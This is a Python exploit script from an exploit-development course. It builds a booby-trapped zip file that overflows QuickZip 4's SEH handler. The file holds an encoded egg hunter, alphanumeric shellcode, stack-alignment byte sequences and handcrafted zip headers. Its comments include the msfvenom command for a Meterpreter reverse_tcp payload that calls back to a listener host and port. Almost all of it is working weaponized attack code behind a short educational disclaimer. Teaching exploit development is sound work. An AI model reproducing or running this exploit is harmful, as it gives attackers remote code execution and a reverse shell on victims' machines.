# Author: Uday Mittal
# Company: Yaksas CSC
# Contact: csc@yaksas.in | twitter.com/yaksas443
# Date: 21-06-2019
# This file is distributed as part of our Hands-on Exploit Development (Advanced) course - https://udemy.com/hands-on-exploit-development-advanced/

# Disclaimer: We condemn illegal activities related to computer hacking, and we will take appropriate actions if anyone in our territory is involved, or intends to be in such unlawful matters.Our tools, live trainings, and tutorials are created for the sole purpose of security awareness and education. We certainly do not encourage our readers/users/students/members to do harms with the knowledge they receive.


# 0x00425631 : pop ecx # pop ebp # ret 0x04 | startnull,asciiprint,ascii,alphanum,uppernum {PAGE_EXECUTE_READ} [QuickZip.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Program Files\QuickZip4\QuickZip.exe)

# Complimentary conditional short jumps
#nasm > jz $-55
#00000000  74C7              jz 0xffffffc9

#nasm > jnz $-55
#00000000  75C7              jnz 0xffffffc9

# Long jump

#nasm > jmp $-250
#00000000  E901FFFFFF        jmp 0xffffff06


# Badchars: 00, 0A, 0D, 0F, 2F, 3A, 5C, 14, 15, 80..FF

# Egg Hunter:
# "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x59\x43\x53\x43\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"

# Command to generate payload shellcode: msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.126.163 LPORT=4444 R > quickzip.raw
# Command to encode payload shellcode with alpha2 encoder: ./alpha2 edi --uppercase < quickzip.raw


# Flow of Events
# 1. Hit POP POP RETN
# 2. Jump back to a buffer space of 55 bytes tacking advantage of character translation by the application: 
# 3. Carve out long jump JMP $-250  (250 Bytes) // 00000000  E901FFFFFF        jmp 0xffffff06
# 4. Start aligning stack for carving out decoded egg hunter
# 5. Jump back 250 bytes
# 6. Complete stack alignment for carving out decoded egg hunter  
# 7. Carve out decoded egg hunter
# 7. Align ESP to avoid the condition of non-existent stack 
# 8. Run Egg Huter code
# 9. Find egg and run Shellcode


from binascii import unhexlify



# Building zip file structure

egghunter = "\x25\x2c\x2c\x2c\x2c\x25\x53\x53\x53\x53\x05\x27\x4D\x55\x4D\x05\x27\x4D\x55\x4D\x05\x27\x4D\x55\x4D\x50\x25\x2c\x2c\x2c\x2c\x25\x53\x53\x53\x53\x05\x57\x39\x75\x57\x05\x58\x3C\x75\x58\x50\x25\x2c\x2c\x2c\x2c\x25\x53\x53\x53\x53\x05\x29\x21\x45\x7D\x05\x2A\x22\x46\x7D\x50\x25\x2c\x2c\x2c\x2c\x25\x53\x53\x53\x53\x05\x77\x2F\x2C\x21\x05\x78\x2F\x2D\x22\x50\x25\x2c\x2c\x2c\x2c\x25\x53\x53\x53\x53\x05\x3C\x05\x5A\x74\x50\x25\x2c\x2c\x2c\x2c\x25\x53\x53\x53\x53\x05\x01\x2C\x66\x17\x05\x01\x2C\x67\x17\x50\x25\x2c\x2c\x2c\x2c\x25\x53\x53\x53\x53\x05\x07\x21\x29\x35\x05\x08\x21\x29\x35\x50\x25\x2c\x2c\x2c\x2c\x25\x53\x53\x53\x53\x05\x22\x2B\x43\x55\x05\x22\x2B\x43\x55\x05\x22\x2B\x44\x55\x50"
	
scode =  "WYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJIKLKXMRUPUP5PCPK9JEFQO0BDLK0PP0LKPRDLLK1BB4LK2R7XTOOG0JWV6QKONLWLSQSLS2FLQ0O18O4MUQ8GKRL20RQGLK0R20LKQZWLLKPL4QD8JCQXS1N1PQLK6910S1N3LKQYTXJC7J1YLKVTLKS1IFVQKONLO1XOTMEQYW6XKPBUJVTCCMZX7KCMGTT5KTPXLK0XWTS1XSSVLKTL0KLK0X5LC1XSLKS4LKUQXPMY1T6DQ41K1K3QV9PZPQKOM0QOQOPZLKDRZKLM1MBH6SWB30EP2HCGT3VRQO0T2HPL3GGV5WLIKXKOXPNXJ0UQEPS0WYYT64F0U86IMP2KEPKON5BJTJSXYP98SJRN3X4B5PR1QLK9JFPPV0F00PW0V01PPP3XZJDOYOM0KOYELWBJB00V1GBHLYY544SQKON5LEO0CD4JKOPNDHSEZLM8CWUPUPEPRJ5PRJS4PVPWCX328YO8QOKO8UK3JXUPSNVVLKP6BJQP3XUPR05P30PVBJS0SXV8OTPSM5KON5Z30SSZ5P0VPSPWU8S2HYO8QOKO9EMSL85PCMWXPXSX5P1PUP302J5PPPSXDK6ODOVPKOYE0WU8T5RNPMCQKOIEQN1NKODLVD4OK540KOKOKOKYMKKOKOKOUQO3WY9VSE9QISOKL0OENBPV3ZEP1CKON5A"
	
payload =  "A" * 37  + "\x50\x2f" + egghunter  + "\x54\x58\x66\x2D\x06\x06\x50\x2f" + "A" *30 + "\x54\x58\x66\x05\x3B\x06\x50\x2F\x66\x05\x04\x04\x66\x50\x66\x50\x66\x2D\x0b\x7F\x66\x2D\x0B\x7F\x66\x50\x66\x05\x79\x7d\x66\x05\x78\x7c" + "A" * 10 + "\x74\x80\x75\x80" + "\x31\x56\x42\x00"  + "YCSCYCSC" +  scode + "D" * 3000 + ".txt"							# File name

payloadLength = len(payload)

payloadLengthhex = format(payloadLength,'#06x')

payloadLengthByte1 = unhexlify(payloadLengthhex[2:4])
payloadLengthByte2 = unhexlify(payloadLengthhex[4:6])

sizeCD = format(46+payloadLength,'#06x')

sizeCDByte1 = unhexlify(sizeCD[2:4]) 
sizeCDByte2 = unhexlify(sizeCD[4:6])

offsetCD = format(30+payloadLength,'#06x')

offsetCDByte1 = unhexlify(offsetCD[2:4])
offsetCDByte2 = unhexlify(offsetCD[4:6])

lf_header = "\x50\x4B\x03\x04" 							# Local file header signature
lf_header += "\x00\x00"  	   							# Version needed to extract (minimum)
lf_header += "\x00\x00"									# General purpose bit flag
lf_header += "\x00\x00"									# Compression method
lf_header += "\x6E\x3F"									# File last modification time	
lf_header += "\xC3\x4E"									# File last modification date
lf_header += "\x00\x00\x00\x00"							# CRC-32
lf_header += "\x00\x00\x00\x00"							# Compressed size
lf_header += "\x00\x00\x00\x00"							# Uncompressed size
lf_header += payloadLengthByte2 + payloadLengthByte1 	# file size  - DYNAMIC
lf_header +="\x00\x00"									# Extra field length

cdf_header = "\x50\x4B\x01\x02"							# Central directory file header signature
cdf_header += "\x14\x00"								# Version made by
cdf_header += "\x00\x00"								# Version needed to extract (minimum)
cdf_header += "\x00\x00"								# General purpose bit flag
cdf_header += "\x00\x00"								# Compression method
cdf_header += "\x6E\x3F"								# File last modification time
cdf_header += "\xC3\x4E"								# File last modification date
cdf_header += "\x00\x00\x00\x00"						# CRC-32
cdf_header += "\x00\x00\x00\x00" 						# Compressed size
cdf_header += "\x00\x00\x00\x00"						# Uncompressed size
cdf_header += payloadLengthByte2 + payloadLengthByte1 	# file size - DYNAMIC
cdf_header += "\x00\x00"								# Extra field length
cdf_header += "\x00\x00" 								# File comment length 
cdf_header += "\x00\x00"								# Disk number where file starts
cdf_header += "\x00\x00"								# Internal file attributes
cdf_header += "\x20\x00\x00\x00"						# External file attributes
cdf_header += "\x00\x00\x00\x00"						# Relative offset of local file header

eofcdf_header = "\x50\x4B\x05\x06"						# End of central directory signature
eofcdf_header += "\x00\x00"								# Number of this disk
eofcdf_header += "\x00\x00"								# Disk where central directory starts
eofcdf_header += "\x01\x00"								# Number of central directory records on this disk
eofcdf_header += "\x01\x00"								# Total number of central directory records
eofcdf_header += sizeCDByte2 + sizeCDByte1 + "\x00\x00" # Size of central directory (bytes) - DYNAMIC
eofcdf_header += offsetCDByte2 +  offsetCDByte1 + "\x00\x00" # Offset of start of central directory, relative to start of archive - DYNAMIC
eofcdf_header +="\x00\x00"								# Comment length 



filename= "zippoc.zip"	
print "Creating " + filename + " file \n";
zipfile = open(filename,'w')
zipfile.write(lf_header + payload + cdf_header + payload + eofcdf_header)
zipfile.close()
	